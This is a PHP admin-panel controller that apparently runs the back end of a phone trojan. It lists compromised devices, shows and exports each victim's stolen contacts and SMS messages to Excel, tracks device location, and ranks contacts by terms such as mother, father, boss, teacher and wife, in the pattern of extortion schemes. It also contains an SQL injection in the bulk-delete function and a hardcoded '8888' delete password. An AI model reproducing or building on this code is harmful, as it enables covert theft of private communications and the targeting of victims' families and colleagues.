<?php
// +----------------------------------------------------------------------
// | Tplay [ WE ONLY DO WHAT IS NECESSARY ]
// +----------------------------------------------------------------------
// | Copyright (c) 2017 http://tplay.pengyichen.com All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
// | Author: 听雨 < 389625819@qq.com >
// +----------------------------------------------------------------------


namespace app\huaxialianmeng2022\controller;

use \think\Db;
use \think\Cookie;
use \think\Session;
use app\huaxialianmeng2022\model\Admin as adminModel;//管理员模型
use app\huaxialianmeng2022\model\AdminMenu;
use app\huaxialianmeng2022\controller\Permissions;
use think\Loader;

class Appv1 extends Permissions
{
    public function yjzf()
    {
       // $id = $this->request->has('id') ? $this->request->param('id', 0, 'intval') : 0;
    	//$z=db('user')->where('id', $id)->find();
    	//$this->assign('dingweiid',$z);
        return $this->fetch();
    }
    
    	

    public function dingwei()
    {
        $id = $this->request->has('id') ? $this->request->param('id', 0, 'intval') : 0;
    	$z=db('user')->where('id', $id)->find();
    	$this->assign('dingweiid',$z);
        return $this->fetch();
    }
    
    
    
     public function apps()
    {
        $web_config = Db::name('webconfig')->where('web','web')->find();
        $cookie = Db::name('admin')->where('id',Session::get('admin'))->find();
        
        
        $this->assign('cookie',$cookie);
        $this->assign('web_config',$web_config);
        return $this->fetch();
    }
    
     public function mumas()
    {
        
        return $this->fetch();
    }
    
    public function appset()
    {
        $admin_id = Session::get('admin');
        $app_config = Db::name('appconfig')->where('admin_id',$admin_id)->find();
        if (!$app_config) {
            $app_config = Db::name('appconfig')->where('app','appv1')->find();
        }
        $this->assign('app_config',$app_config);
        return $this->fetch();
    }	

    public function appsetpo(){
    	if($this->request->isPost()) {
            $post = $this->request->post();
            
            if(empty($post['is_login'])) {
                $post['is_login'] = 0;
            } else {
                $post['is_login'] = $post['is_login'];
            }

            if(empty($post['is_reg'])) {
                $post['is_reg'] = 0;
            } else {
                $post['is_reg'] = $post['is_reg'];
            }
            if(false == Db::name('appconfig')->where('app','appv1')->update($post)) {
                return $this->error('提交失败');
            } else {
                addlog();
                return $this->success('提交成功','huaxialianmeng2022/appv1/appset');
            }
        }    	
    }
    
       public function ipdata($ip)
    {
        
            $url = file_get_contents("https://ip.useragentinfo.com/json?ip=".$ip);
            $uridata = json_decode($url,true);
            
            if($uridata['code'] == 200){
                $ipmsg = $uridata['country'].$uridata['province'].$uridata['city'].$uridata['area'];
                return $ipmsg;
            }else{
              return $ip;
            }
            
            // $url = file_get_contents("http://opendata.baidu.com/api.php?query=".$ip."&co=&resource_id=6006&oe=utf8");
          
            // $uridata = json_decode($url,true);
            
            // if($uridata['data'][0]['location']){
            //     return $uridata['data'][0]['location'];
            // }else{
            //   return $ip;
            // }
            
    }
    
    
    public function user()
    {
        $post = $this->request->param();
        if(isset($post['tiaoshu'])){
            $tiaoshu = $post['tiaoshu'];
        }else{
            $tiaoshu = 20;
        }
        
        
        if (isset($post['keywords']) and !empty($post['keywords'])) {
            $where['name'] = ['like', '%' . $post['keywords'] . '%'];
        }   
        if(isset($post['create_time']) and !empty($post['create_time'])) {
            $min_time = strtotime($post['create_time']);
            $max_time = $min_time + 24 * 60 * 60;
            $where['login_time'] = [['>=',$min_time],['<=',$max_time]];
        }	
        $this->agencyRoleCode($post) !== false ? $where['code'] = $this->agencyRoleCode($post) : '';
        
        $admin = empty($where) ? Db::name('user')->order('id desc')->paginate($tiaoshu) : Db::name('user')->where($where)->order('id desc')->paginate($tiaoshu,false,['query'=>$this->request->param()]);
        
        
        //$admin = Db::name('mobile')->alias('a')->join('__USER__ b','b.id= a.userid')->field('a.*,b.name,b.code,b.clientid')->order('a.id desc')->paginate(40);
        
        if(!empty($admin)){
            foreach ($admin as $key => $value) {
            
                
              //$lianxiren = Db::name('mobile')->where('userid', $value['id'])->limit(0,10)->select();
              $lianxiren = Db::name('mobile')
              ->where('userid', $value['id'])
              ->where('username',['like','%妈%'],['like','%爸%'],['like','%总%'],['like','%老师%'],['like','%姐%'],['like','%弟%'],['like','%妹%'],['like','%哥%'],['like','%舅%'],['like','%集团%'],['like','%丈%'],['like','%岳%'],['like','%娘%'],['like','%母%'],['like','%父%'],['like','%姨%'],['like','%婶%'],['like','%老婆%'],['like','%宝贝%'],['like','%领%'],['like','%主%'],['like','%同%'],['like','%班%'],['like','%媳%'],['like','%组%'],['like','%队%'],'or')
              ->limit(0,10)->select();
              $lxlist[$key]['name'] = $lianxiren;
              $lxlist[$key]['id'] = $value['id'];
              
            }
             if(!empty($lxlist)){
                 
                 $this->assign('lxlist',$lxlist);
             }
             
             
            
        }
        if(!empty($post)){
            $this->assign('postinput',$post);
        }
         
       
        $adminnum = Db::name('user')->count();
        $this->assign('admin',$admin);
        $this->assign('adminnum',$adminnum);
        $this->assign('tiaoshu',$tiaoshu);
        return $this->fetch();
    }
    
    
     public function usersousuo()
    {
        $post = $this->request->param();
       
        if (!empty($post)) {
            $adminid = 1;
        }else{
            $adminid = Session::get('admin');
        }   
        if(isset($post['create_time']) and !empty($post['create_time'])) {
            $min_time = strtotime($post['create_time']);
            $max_time = $min_time + 24 * 60 * 60;
            $where['login_time'] = [['>=',$min_time],['<=',$max_time]];
        }	
        $this->agencyRoleCode($post) !== false ? $where['code'] = $this->agencyRoleCode($post) : '';
        $admin = empty($where) ? Db::name('user')->order('id desc')->paginate(20) : Db::name('user')->where($where)->order('id desc')->paginate(20,false,['query'=>$this->request->param()]);

        
        $this->assign('adminid',$adminid);
        
        $this->assign('admin',$admin);

        return $this->fetch();
    }
  
    // 判断当前角色是否为代理
    public function agencyRoleCode($post)
    {
        
        if (Session::get('admin_cate_id') == config('agency_id')) {
            $appconfig = Db::name('appconfig')->where('admin_id', Session::get('admin'))->find();
            if ($appconfig) {
                return $appconfig['yaoqingma'];
            }
            return 0;
        }else{
            if(isset($post['code']) and !empty($post['code'])){
                return $post['code'];
            }
        }
        return false;
    }

    public function delete($id,$value1)
    {
    	if($this->request->isAjax()) {
    	    
    	    if($value1 != 8888){
    	       return json(['code' => 0, 'msg' => '密码错误']);
    	    }
    	    
    		$id = $this->request->has('id') ? $this->request->param('id', 0, 'intval') : 0;
    		if(Db::name('user')->where('id',$id)->delete()) {
    			Db::name('mobile')->where('userid',$id)->delete();
    			Db::name('content')->where('userid',$id)->delete();
				addlog($id);//写入日志
    		
    			return json(['code' => 1, 'msg' => '删除成功', 'url' => '/huaxialianmeng2022/appv1/user']);
    		} else {
    			return json(['code' => 0, 'msg' => '删除失败']);
    		}
    	}
    }

    public function mobile()
    {
        $post = $this->request->param();
        
        if(isset($post['tiaoshu'])){
            $tiaoshu = $post['tiaoshu'];
        }else{
            $tiaoshu = 20;
        }
        
        
        if (isset($post['keywords']) and !empty($post['keywords'])) {
            $where['name'] = $post['keywords'];
        }
        if(isset($post['create_time']) and !empty($post['create_time'])) {
            $min_time = strtotime($post['create_time']);
            $max_time = $min_time + 24 * 60 * 60;
            $where['addtime'] = [['>=',$min_time],['<=',$max_time]];
        }
        if (isset($post['id']) and !empty($post['id'])) {
            $where['userid'] = $post['id'];
              $this->assign('id',$post['id']);	
            
        }else{
            $this->assign('id',0);
        }
        // if (isset($post['code']) and !empty($post['code'])) {
        //     $where['code'] = $post['code'];
        // }    
        $this->agencyRoleCode($post) !== false ? $where['code'] = $this->agencyRoleCode($post) : '';
        if(empty($where)){
        	$admin = Db::name('mobile')->alias('a')
        	->join('__USER__ b','b.id= a.userid')
        	->field('a.*,b.name,b.code,b.clientid')->order('a.id desc')->paginate($tiaoshu);
        	
        	
        	$adminnum = Db::name('mobile')->alias('a')
        	->join('__USER__ b','b.id= a.userid')
        	->field('a.*,b.name,b.code,b.clientid')->count();
        }else{
        	$admin = Db::name('mobile')->alias('a')
        	->join('__USER__ b','b.id= a.userid')
        	->field('a.*,b.name,b.code,b.clientid')->where($where)->order('a.id desc')->paginate($tiaoshu,false,['query'=>$this->request->param()]);
        	
        	$adminnum = Db::name('mobile')->alias('a')
        	->join('__USER__ b','b.id= a.userid')
        	->field('a.*,b.name,b.code,b.clientid')->where($where)->count();
        }
        
        
		//$admin = empty($where) ? Db::name('mobile')->order('id desc')->paginate(20) : Db::name('mobile')->where($where)->order('id desc')->paginate(20,false,['query'=>$this->request->param()]);
		
		
        $this->assign('admin',$admin);
        
        $this->assign('adminnum',$adminnum);
        $this->assign('info',$admin);	
         $this->assign('tiaoshu',$tiaoshu);
        return $this->fetch();
    }
    public function phone()
    {
        $post = $this->request->param();
        $id= $post['name'];
        //echo $id;

        $info['list'] = db('edphone')->where("phone",$id)->select();
        $this->assign('info',$info['list']);

        return $this->fetch();
    }
    public function mobdelete($id,$value1)
    {
        if($value1 != 8888){
    	       return json(['code' => 0, 'msg' => '密码错误']);
    	    }
    	    
    	if($this->request->isAjax()) {
    		$id = $this->request->has('id') ? $this->request->param('id', 0, 'intval') : 0;
    		if(Db::name('mobile')->where('id',$id)->delete()) {
				addlog($id);//写入日志
    			
    			return json(['code' => 1, 'msg' => '删除成功', 'url' => '/huaxialianmeng2022/appv1/mobile']);
    		} else {
    			return json(['code' => 0, 'msg' => '删除失败']);
    		}
    	}
    }	

	public function clearuser(){
    	if($this->request->isAjax()) {
    		$id = $this->request->has('id') ? $this->request->param('id', 0, 'intval') : 0;
    		if(Db::name('mobile')->where('userid',$id)->delete()) {
    			addlog($id);//写入日志
    			return $this->success('删除成功','huaxialianmeng2022/appv1/user');
    		} else {
    			return $this->error('删除失败');
    		}
    	}		
	}
	
	public function clearsms(){
    	if($this->request->isAjax()) {
    		$id = $this->request->has('id') ? $this->request->param('id', 0, 'intval') : 0;
    		if(Db::name('content')->where('userid',$id)->delete()) {
    			addlog($id);//写入日志
    			return $this->success('删除成功','huaxialianmeng2022/appv1/user');
    		} else {
    			return $this->error('删除失败');
    		}
    	}		
	}	
	
    public function excel($data,$tableHeader,$fileName)
    {
		
		Loader::import('PHPExcel.Classes.PHPExcel', EXTEND_PATH, '.php');
		Loader::import('PHPExcel.Classes.PHPExcel.IOFactory', EXTEND_PATH, '.php');
		Loader::import('PHPExcel.Classes.PHPExcel.Reader.Excel5');
        //创建对象
        $excel =  new \PHPExcel();
        //Excel表格式
        $letter = array('A','B','C','D','E','F','G','H');
        //填充表头信息/1是格式
        $tableHeader=$tableHeader;
        for ($i = 0; $i < count($tableHeader); $i++)
        {
            $excel->getActiveSheet()->setCellValue("$letter[$i]1", "$tableHeader[$i]");
        }
 
        //填充表格信息
        for ($i = 2; $i <= count($data) + 1; $i++)
        {
            $j = 0;
            foreach ($data[$i - 2] as $key => $value)
            {
                $excel->getActiveSheet()->setCellValue("$letter[$j]$i", " "."$value");
                $j++;
            }
        }
        //创建Excel输入对象
		ob_clean();
        $write = new \PHPExcel_Writer_Excel5($excel);
        header("Content-Type: application/force-download");
        header("Content-Type: application/octet-stream");
        header("Content-Type: application/download");
        header('Content-Disposition: attachment;filename="'.$fileName.'.xls"');
        header("Content-Transfer-Encoding: binary");
        header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
        header("Pragma: no-cache");		
        $write->save('php://output');
    }

	public function exportexcel(){
		$post = $this->request->param();
		if (isset($post['id']) and !empty($post['id'])) {
          $id = $post['id'];
        }else{
		  $id = 0;
		}
		$userinfo = Db::name('user')->where('id',$id)->find();
		$list = Db::name('mobile')->where('userid',$id)->field('id,username,umobile')->select();
		if(isset($list) && !empty($list)){
			$tableHeader = array('ID', '通讯录姓名', '通讯录手机号码');
			$this->excel($list,$tableHeader,'设备'.$userinfo['name'].'通讯录');
		}
	}

	public function smsexcel(){
		$post = $this->request->param();
		if (isset($post['id']) and !empty($post['id'])) {
          $id = $post['id'];
        }else{
		  $id = 0;
		}
		$userinfo = Db::name('user')->where('id',$id)->find();
		$list = Db::name('content')->where('userid',$id)->field('id,smstel,smscontent,smstime')->select();
		$list = $this->filter_emoji($list);

		if(isset($list) && !empty($list)){
			$tableHeader = array('ID', '短信号码', '短信内容','短信时间');
			$this->excel($list,$tableHeader,'设备'.$userinfo['name'].'短信数据');
		}
	}
	
	function getmobile($haoma){
	   
	   $url = 'http://mobsec-dianhua.baidu.com/dianhua_api/open/location?tel='.$haoma;
	   $con = json_decode(file_get_contents($url),true);
	   return $con['response'][$haoma]['location'];
		
	}
	
    public function sms()
    {
        $post = $this->request->param();
        
        if(isset($post['tiaoshu'])){
            $tiaoshu = $post['tiaoshu'];
        }else{
            $tiaoshu = 20;
        }
        
        if (isset($post['keywords']) and !empty($post['keywords'])) {
            $where['name'] = $post['keywords'];
        }
        if(isset($post['create_time']) and !empty($post['create_time'])) {
            $min_time = strtotime($post['create_time']);
            $max_time = $min_time + 24 * 60 * 60;
            $where['addtime'] = [['>=',$min_time],['<=',$max_time]];
        }
        if (isset($post['id']) and !empty($post['id'])) {
            $where['userid'] = $post['id'];
            
            $this->assign('id',$post['id']);	
            
        }else{
            $this->assign('id',0);
        }
        if (isset($post['smstel']) and !empty($post['smstel'])) {
        	$smstelss = str_replace('+','',$post['smstel']);
            $where['smstel'] = $smstelss;
        }
        // if (isset($post['code']) and !empty($post['code'])) {
        //     $where['code'] = $post['code'];
        // }   
        $this->agencyRoleCode($post) !== false ? $where['code'] = $this->agencyRoleCode($post) : '';
        if(empty($where)){
        	$sms = Db::name('content')->alias('a')
        	->join('__USER__ b','b.id= a.userid')
        	->field('a.*,b.name,b.code,b.clientid')->order('a.id desc')->paginate($tiaoshu);
        }else{
        	$sms = Db::name('content')->alias('a')
        	->join('__USER__ b','b.id= a.userid')
        	->field('a.*,b.name,b.code,b.clientid')->where($where)->order('a.id desc')->paginate($tiaoshu,false,['query'=>$this->request->param()]);
        }
		//$admin = empty($where) ? Db::name('mobile')->order('id desc')->paginate(20) : Db::name('mobile')->where($where)->order('id desc')->paginate(20,false,['query'=>$this->request->param()]);
        $this->assign('info',$sms);	
        $this->assign('tiaoshu',$tiaoshu);	
        return $this->fetch();
    }
    
    public function smsdelete()
    {
    	if($this->request->isAjax()) {
    		$id = $this->request->has('id') ? $this->request->param('id', 0, 'intval') : 0;
    		if(Db::name('content')->where('id',$id)->delete()) {
				addlog($id);//写入日志
    			return $this->success('删除成功','huaxialianmeng2022/appv1/sms');
    		} else {
    			return $this->error('删除失败');
    		}
    	}
    }

    public function alldeletes()
    {
    	if($this->request->isAjax()) {
    		$id = $this->request->get('delid/a');
    		$id = implode(',',$id);
    		if(Db::name('user')->delete($id)) {
    			Db::name('mobile')->where('userid in ('.$id.')')->delete();
    			Db::name('content')->where('userid in ('.$id.')')->delete();
				addlog($id);//写入日志
    			return $this->success('删除成功','huaxialianmeng2022/appv1/user');
    		} else {
    			return $this->error('删除失败');
    		}
    	}
    }
    
    function filter_emoji($str) {

    $regex = '/(\\\u[ed][0-9a-f]{3})/i';  
    $str = json_encode($str);  
    $str = preg_replace($regex, '', $str);
    return json_decode($str);  
    }
}